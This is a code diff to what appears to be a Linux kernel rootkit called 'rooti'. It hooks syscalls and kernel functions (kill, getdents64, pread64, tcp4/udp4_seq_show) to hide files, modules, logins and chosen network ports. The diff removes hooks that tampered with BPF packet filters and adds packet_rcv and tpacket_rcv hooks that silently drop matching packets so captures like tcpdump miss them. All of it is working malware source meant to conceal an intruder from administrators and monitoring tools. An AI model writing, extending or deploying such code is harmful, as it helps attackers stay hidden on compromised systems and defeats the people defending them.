@@ -17,7 +17,6 @@
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
-#include "capabilities/hiding/net.h"
 #include "hooking.h"
 #include "state.h"
 #include "utils.h"
@@ -43,11 +42,14 @@ struct inode *proc_inode;
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
-static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
-static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
 
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
+static int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
+                              struct packet_type *pt, struct net_device *orig_dev);
+static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
+                               struct packet_type *pt, struct net_device *orig_dev);
+
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static void (*orig_do_exit)(long code);
@@ -121,92 +123,18 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     return ret;
 }
 
-static asmlinkage long hook_socket(const struct pt_regs *regs)
-{
-    struct file *file;
-    struct socket *sock;
-    int family = regs->di;
-    int fd = orig_socket(regs);
-    
-    if (fd == -1 || family != AF_PACKET) {
-        return fd;
-    }
-
-    file = fget(fd);
-    if (file == NULL) {
-        ROOTI_DEBUG("fget() failed");
-        return fd;   
-    }
-    sock = sock_from_file(file);
-    fput(file);
-    if (sock == NULL) {
-        ROOTI_DEBUG("sock_from_file() failed");
-        return fd;
-    }
-
-    lock_sock(sock->sk);
-    rooti_overwrite_traffic_filter(sock->sk);
-    release_sock(sock->sk);
-    return fd;
-}
-
-static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
-{
-    int fd = regs->di;
-    int optname = regs->dx;
-    int optlen = regs->r8;
-    sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);
-
-    struct file *file;
-    struct socket *sock;
-    struct sock_fprog user_fprog;
-
-    int err = orig_setsockopt(regs);
-    if (err)
-        return err;
-
-    file = fget(fd);
-    if (file == NULL) {
-        ROOTI_DEBUG("fget() failed");
-        return 0;   
-    }
-    sock = sock_from_file(file);
-    fput(file);
-    if (sock == NULL) {
-        ROOTI_DEBUG("sock_from_file() failed");
-        return 0;
-    }
-
-    lock_sock(sock->sk);
-    switch (optname) {
-    case SO_ATTACH_FILTER:
-        err = copy_bpf_fprog_from_user(&user_fprog, optval, optlen);
-        if (err) {
-            ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
-            return 0;
-        }
-        
-        rooti_inject_traffic_filter(sock->sk, &user_fprog);
-        break;
-
-    case SO_DETACH_FILTER:
-        rooti_overwrite_traffic_filter(sock->sk);
-        break;
-
-    default:
-        break;
-    }
-
-    release_sock(sock->sk);
-    return 0;
-}
-
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
 
-    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num))
-        return 0;
+    if (socket == SEQ_START_TOKEN)
+        return orig_tcp4_seq_show(seq, v);
+
+    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_TCP_PORTS[i] == socket->sk_num) {
+            return 0;
+        }
+    }
 
     return orig_tcp4_seq_show(seq, v);
 }
@@ -215,10 +143,50 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
 
-    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num))
-        return 0;
+    if (socket == SEQ_START_TOKEN)
+       return orig_udp4_seq_show(seq, v);
+
+    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_UDP_PORTS[i] == socket->sk_num) {
+            return 0;
+        }
+    }
 
     return orig_udp4_seq_show(seq, v);
+}
+
+static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
+                           struct packet_type *pt, struct net_device *orig_dev)
+{
+    enum rooti_net_rule_action action;
+    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);
+
+    switch (action) {
+    case ROOTI_PACKET_DROP:
+        kfree_skb(skb);
+        return 0;
+    case ROOTI_PACKET_ACCEPT:
+        return orig_packet_rcv(skb, dev, pt, orig_dev);
+    default:
+        BUG();
+    }    
+}
+
+static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
+                           struct packet_type *pt, struct net_device *orig_dev)
+{
+    enum rooti_net_rule_action action;
+    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);
+
+    switch (action) {
+    case ROOTI_PACKET_DROP:
+        kfree_skb(skb);
+        return 0;
+    case ROOTI_PACKET_ACCEPT:
+        return orig_tpacket_rcv(skb, dev, pt, orig_dev);
+    default:
+        BUG();
+    }    
 }
 
 // Should really be flagged as noreturn but that raises an objtool warning
@@ -262,10 +230,10 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
     ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
+    ROOTI_FUNC_HOOK("packet_rcv", hook_packet_rcv, &orig_packet_rcv),
+    ROOTI_FUNC_HOOK("tpacket_rcv", hook_tpacket_rcv, &orig_tpacket_rcv),
     ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
     ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
